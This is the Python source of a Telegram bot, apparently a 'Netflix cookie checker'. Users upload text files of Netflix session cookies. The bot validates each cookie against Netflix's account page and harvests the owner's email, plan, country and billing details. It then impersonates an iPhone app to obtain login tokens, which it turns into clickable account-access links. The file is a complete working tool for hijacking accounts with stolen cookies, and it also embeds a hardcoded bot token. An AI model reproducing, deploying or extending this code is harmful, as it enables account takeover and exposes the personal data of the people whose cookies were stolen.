import os
import sys
import re
import json
import tempfile
import shutil
import requests
import urllib.parse
from datetime import datetime
from threading import Lock
import time
import gc
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============ PORT FIX ============
PORT = int(os.environ.get("PORT", 10000))
print(f"✅ Server will run on port {PORT}")

# ============ TELEGRAM IMPORTS ============
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
except Exception as e:
    print(f"❌ Telegram import error: {e}")
    sys.exit(1)

# ============ NETFLIX CONFIGURATION ============
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

# ============ BOT CONFIGURATION ============
BOT_TOKEN = "7168370915:AAE-PfYTjsxPr5uKx62_M_ykp0Ek6uHQqq4"

# ============ COUNTERS ============
class Counters:
    def __init__(self):
        self.hit = 0
        self.custom = 0
        self.free = 0
        self.bad = 0
        self.lock = Lock()
    
    def get_stats(self):
        with self.lock:
            return f"HIT: {self.hit} | CUSTOM: {self.custom} | FREE: {self.free} | BAD: {self.bad}"
    
    def add_hit(self):
        with self.lock:
            self.hit += 1
    
    def add_custom(self):
        with self.lock:
            self.custom += 1
    
    def add_free(self):
        with self.lock:
            self.free += 1
    
    def add_bad(self):
        with self.lock:
            self.bad += 1
    
    def reset(self):
        with self.lock:
            self.hit = 0
            self.custom = 0
            self.free = 0
            self.bad = 0

counters = Counters()

# ============ COOKIE FUNCTIONS ============
def parse_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) >= 7:
        return {parts[5]: parts[6]}
    return {}

def decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value

def fix_email_display(email):
    if not email or email == "Unknown":
        return email
    return email.replace('\\x40', '@').replace('%40', '@')

def extract_cookie_dict(text):
    cookie_dict = {}
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        cookie_dict.update(parse_netscape_cookie_line(line))
    try:
        data = json.loads(text)
        if isinstance(data, list):
            for cookie in data:
                name = cookie.get("name")
                value = cookie.get("value")
                if name in COOKIE_KEYS and isinstance(value, str):
                    cookie_dict[name] = decode_cookie_value(value)
        elif isinstance(data, dict):
            if any(key in data for key in COOKIE_KEYS):
                for key in COOKIE_KEYS:
                    value = data.get(key)
                    if isinstance(value, str):
                        cookie_dict[key] = decode_cookie_value(value)
            elif isinstance(data.get("cookies"), list):
                for cookie in data["cookies"]:
                    name = cookie.get("name")
                    value = cookie.get("value")
                    if name in COOKIE_KEYS and isinstance(value, str):
                        cookie_dict[name] = decode_cookie_value(value)
    except:
        pass
    for key in COOKIE_KEYS:
        if key in cookie_dict:
            continue
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if match:
            cookie_dict[key] = decode_cookie_value(match.group(1))
    return cookie_dict

def extract_cookies_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        return extract_cookie_dict(content)
    except Exception:
        return {}

def get_account_info(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        return None
    url = "https://www.netflix.com/account"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "close",
    }
    cookies = {"NetflixId": netflix_id}
    try:
        response = requests.get(url, headers=headers, cookies=cookies, timeout=10, verify=False)
        text = response.text
        response.close()
        
        info = {
            "status": "Unknown",
            "email": "Unknown",
            "country": "Unknown",
            "plan": "Unknown",
            "maxStreams": "Unknown",
            "memberSince": "Unknown",
            "nextBilling": "Unknown",
        }
        
        status_match = re.search(r'"membershipStatus":"(\w+)"', text)
        if status_match:
            status = status_match.group(1)
            if status == "CURRENT_MEMBER":
                info["status"] = "Active"
            elif status == "FORMER_MEMBER":
                info["status"] = "Canceled"
            elif status == "NEVER_MEMBER":
                info["status"] = "Free"
            else:
                info["status"] = status
        
        email_match = re.search(r'"profileEmailAddress":"([^"]+)"', text)
        if not email_match:
            email_match = re.search(r'"emailAddress":"([^"]+)"', text)
        if email_match:
            info["email"] = fix_email_display(email_match.group(1))
        
        country_match = re.search(r'"currentCountry":"([^"]+)"', text)
        if country_match:
            info["country"] = country_match.group(1)
        
        plan_match = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"', text)
        if not plan_match:
            plan_match = re.search(r'"localizedPlanName":"([^"]+)"', text)
        if plan_match:
            info["plan"] = plan_match.group(1)
        
        streams_match = re.search(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)', text)
        if streams_match:
            info["maxStreams"] = streams_match.group(1)
        
        since_match = re.search(r'"memberSince":"([^"]+)"', text)
        if since_match:
            info["memberSince"] = since_match.group(1)
        
        billing_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"', text)
        if billing_match:
            info["nextBilling"] = billing_match.group(1)
        
        return info
    except Exception:
        return None

def get_nftoken_from_cookies(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        return None, None
    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    headers["Connection"] = "close"
    try:
        response = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, timeout=10, verify=False)
        response.raise_for_status()
        data = response.json()
        response.close()
        token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
        token = token_data.get("token")
        expires = token_data.get("expires")
        if not token:
            return None, None
        if isinstance(expires, int) and len(str(expires)) == 13:
            expires //= 1000
        return token, expires
    except Exception:
        return None, None

def format_expiry(expires):
    if not isinstance(expires, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(expires)

def classify_plan(plan_name):
    if not plan_name:
        return "Unknown"
    plan_lower = plan_name.lower()
    basic_keywords = ["basic", "dasar", "asas", "basis", "básico", "essentiel", "base"]
    standard_keywords = ["standard", "standar", "standart", "estándar", "padrão"]
    premium_keywords = ["premium", "prémium", "perhe"]
    mobile_keywords = ["mobile", "telefon", "celular"]
    
    for kw in mobile_keywords:
        if kw in plan_lower:
            return "Mobile"
    for kw in basic_keywords:
        if kw in plan_lower:
            return "Basic"
    for kw in standard_keywords:
        if kw in plan_lower:
            return "Standard"
    for kw in premium_keywords:
        if kw in plan_lower:
            return "Premium"
    
    return plan_name

def is_valid_cookie(cookie_dict):
    return REQUIRED_COOKIE in cookie_dict

def process_single_cookie_file(file_path):
    try:
        cookie_dict = extract_cookies_from_file(file_path)
        if not is_valid_cookie(cookie_dict):
            return None, None
        
        account_info = get_account_info(cookie_dict)
        if not account_info:
            return None, None
        
        account_info["email"] = fix_email_display(account_info["email"])
        
        if account_info["status"] == "Active":
            token, expires = get_nftoken_from_cookies(cookie_dict)
            if not token:
                return None, None
            
            time_left_str = "Unknown"
            if expires:
                try:
                    expiry_dt = datetime.fromtimestamp(expires)
                    time_now = datetime.now()
                    time_left = expiry_dt - time_now
                    if time_left.total_seconds() > 0:
                        days = time_left.days
                        hours = time_left.seconds // 3600
                        minutes = (time_left.seconds % 3600) // 60
                        time_left_str = f"{days}d {hours}h {minutes}m"
                    else:
                        time_left_str = "EXPIRED"
                except:
                    pass
            
            plan_type = classify_plan(account_info["plan"])
            
            result = {
                "email": account_info["email"],
                "status": account_info["status"],
                "plan": account_info["plan"],
                "plan_type": plan_type,
                "country": account_info["country"],
                "memberSince": account_info["memberSince"],
                "nextBilling": account_info["nextBilling"],
                "maxStreams": account_info["maxStreams"],
                "nftoken": token,
                "expires": expires,
                "expiry_formatted": format_expiry(expires),
                "pc_link": f"https://www.netflix.com/browse?nftoken={token}",
                "phone_link": f"https://www.netflix.com/unsupported?nftoken={token}",
                "time_left": time_left_str
            }
            
            if plan_type in ["Premium", "Standard", "Basic", "Mobile"]:
                return result, "HIT"
            else:
                return None, None
        
        elif account_info["status"] == "Canceled":
            return {"email": account_info["email"], "status": "Canceled", "plan": account_info["plan"], "country": account_info["country"]}, "CUSTOM"
        
        elif account_info["status"] == "Free":
            return {"email": account_info["email"], "status": "Free", "country": account_info["country"]}, "FREE"
        
        else:
            return None, None
            
    except Exception as e:
        return None, None

# ============ TELEGRAM HANDLERS ============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_message = (
        "🎬 **WELCOME TO NETFLIX CHECKER + AUTO CONVERTER NFTOKENS LINKS**\n\n"
        "📤 **PLEASE SEND .TXT FILE TO CHECK**\n\n"
        "📂 **Supported formats:**\n"
        "• Netscape cookie format\n"
        "• JSON format\n"
        "• Direct key=value format\n\n"
        "⚡ **What I do:**\n"
        "✅ Check if cookie is valid\n"
        "✅ Detect plan type: Premium, Standard, Basic, Mobile\n"
        "✅ Auto convert to NFTokens (PC + Phone links)\n"
        "❌ Free, Custom (Canceled), and Bad cookies are not converted\n\n"
        "💎 **Only Premium, Standard, Basic, Mobile plans get NFTokens!**"
    )
    
    await update.message.reply_text(welcome_message, parse_mode="Markdown")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        document = update.message.document
        
        file_name = document.file_name or ""
        if not file_name.lower().endswith('.txt'):
            await update.message.reply_text(
                "❌ **Please send a .TXT file only!**",
                parse_mode="Markdown"
            )
            return
        
        if document.file_size > 1 * 1024 * 1024:
            await update.message.reply_text(
                f"❌ **File too large!**\n\nMax: 1 MB\nYour file: {document.file_size / (1024*1024):.2f} MB",
                parse_mode="Markdown"
            )
            return
        
        status_msg = await update.message.reply_text(
            "⏳ **Processing your file...**\n\n"
            "📊 HIT: 0 | CUSTOM: 0 | FREE: 0 | BAD: 0",
            parse_mode="Markdown"
        )
        
        temp_dir = tempfile.mkdtemp()
        file_path = os.path.join(temp_dir, file_name)
        file = await context.bot.get_file(document.file_id)
        await file.download_to_drive(file_path)
        
        result, status = process_single_cookie_file(file_path)
        
        try:
            shutil.rmtree(temp_dir)
        except:
            pass
        
        if status == "HIT":
            counters.add_hit()
            await status_msg.delete()
            
            status_emoji = "✅"
            plan_emoji = "🟣" if result["plan_type"] == "Premium" else "🔵" if result["plan_type"] == "Standard" else "🟢" if result["plan_type"] == "Basic" else "📱"
            
            message = (
                f"🎬 **Netflix Hit**\n"
                f"💎 **SUBSCRIPTION**\n"
                f"┣ 📧 Email ▸ `{result['email']}` — ✅ Verified\n"
                f"┣ 💎 Plan ▸ {result['plan_type']}\n"
                f"┣ 🌍 Country ▸ {result['country']}\n"
                f"┣ ⏳ Member ▸ {result['memberSince']}\n"
                f"┗ 📅 Next bill ▸ {result['nextBilling']}\n\n"
                f"⏱️ Expires: {result['expiry_formatted']}\n"
                f"⏳ Time Left: {result['time_left']}\n"
                f"📺 Max Streams: {result['maxStreams']}\n\n"
                f"🔑 **NFToken Links:**"
            )
            
            keyboard = [
                [InlineKeyboardButton("💻 PC Link", url=result['pc_link'])],
                [InlineKeyboardButton("📱 Phone Link", url=result['phone_link'])],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                message,
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
            
            await update.message.reply_text(
                f"📊 **Current Stats:** {counters.get_stats()}",
                parse_mode="Markdown"
            )
            
        elif status == "CUSTOM":
            counters.add_custom()
            await status_msg.delete()
            
            message = (
                f"❌ **Custom Account (Canceled)**\n\n"
                f"📧 Email: {result['email']}\n"
                f"📦 Plan: {result['plan']}\n"
                f"🌍 Country: {result['country']}\n\n"
                f"⚠️ This account is **CANCELED**. No NFTokens generated."
            )
            await update.message.reply_text(message, parse_mode="Markdown")
            
            await update.message.reply_text(
                f"📊 **Current Stats:** {counters.get_stats()}",
                parse_mode="Markdown"
            )
            
        elif status == "FREE":
            counters.add_free()
            await status_msg.delete()
            
            message = (
                f"🆓 **Free Account**\n\n"
                f"📧 Email: {result['email']}\n"
                f"🌍 Country: {result['country']}\n\n"
                f"⚠️ This is a **FREE** account. No NFTokens generated."
            )
            await update.message.reply_text(message, parse_mode="Markdown")
            
            await update.message.reply_text(
                f"📊 **Current Stats:** {counters.get_stats()}",
                parse_mode="Markdown"
            )
            
        else:
            counters.add_bad()
            await status_msg.delete()
            
            message = (
                f"❌ **Bad Cookie / Invalid**\n\n"
                f"⚠️ The cookie you provided is **INVALID** or **EXPIRED**.\n\n"
                f"📊 **Current Stats:** {counters.get_stats()}"
            )
            await update.message.reply_text(message, parse_mode="Markdown")
        
    except Exception as e:
        await update.message.reply_text(
            f"❌ **Error:** {str(e)}",
            parse_mode="Markdown"
        )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats_text = (
        f"📊 **Current Statistics**\n\n"
        f"{counters.get_stats()}\n\n"
        f"🔄 Use /resetstats to reset counters"
    )
    keyboard = [
        [InlineKeyboardButton("🔄 Reset Stats", callback_data="reset_stats")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(stats_text, reply_markup=reply_markup, parse_mode="Markdown")

async def reset_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    counters.reset()
    await update.message.reply_text("📊 **Statistics have been reset!**", parse_mode="Markdown")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "📖 **How to Use**\n\n"
        "1️⃣ Send a .TXT file containing Netflix cookies\n"
        "2️⃣ I will check the cookie and detect:\n"
        "   • Premium ✅ → NFTokens generated\n"
        "   • Standard ✅ → NFTokens generated\n"
        "   • Basic ✅ → NFTokens generated\n"
        "   • Mobile ✅ → NFTokens generated\n"
        "   • Custom (Canceled) ❌ → No NFTokens\n"
        "   • Free ❌ → No NFTokens\n"
        "   • Bad ❌ → No NFTokens\n\n"
        "📂 **Cookie Formats accepted:**\n"
        "• Netscape format\n"
        "• JSON format\n"
        "• Direct key=value format\n\n"
        "💎 **NFToken Links:** PC + Phone\n\n"
        "📊 Use /stats to see statistics\n"
        "🔄 Use /resetstats to reset counters"
    )
    await update.message.reply_text(help_text, parse_mode="Markdown")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "reset_stats":
        counters.reset()
        await query.edit_message_text("📊 **Statistics have been reset!**", parse_mode="Markdown")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Error: {context.error}")

# ============ MAIN ============
def main():
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("stats", stats_command))
        application.add_handler(CommandHandler("resetstats", reset_stats_command))
        application.add_handler(CallbackQueryHandler(button_callback, pattern="^(reset_stats)$"))
        application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
        application.add_error_handler(error_handler)
        
        print("🤖 Netflix Cookie Checker Bot is running...")
        print("✅ Single TXT file processing")
        print("💎 Premium, Standard, Basic, Mobile → NFTokens")
        print("❌ Custom, Free, Bad → No NFTokens")
        print("🌐 Keep-alive server running")
        
        application.run_polling(allowed_updates=Update.ALL_TYPES)
        
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
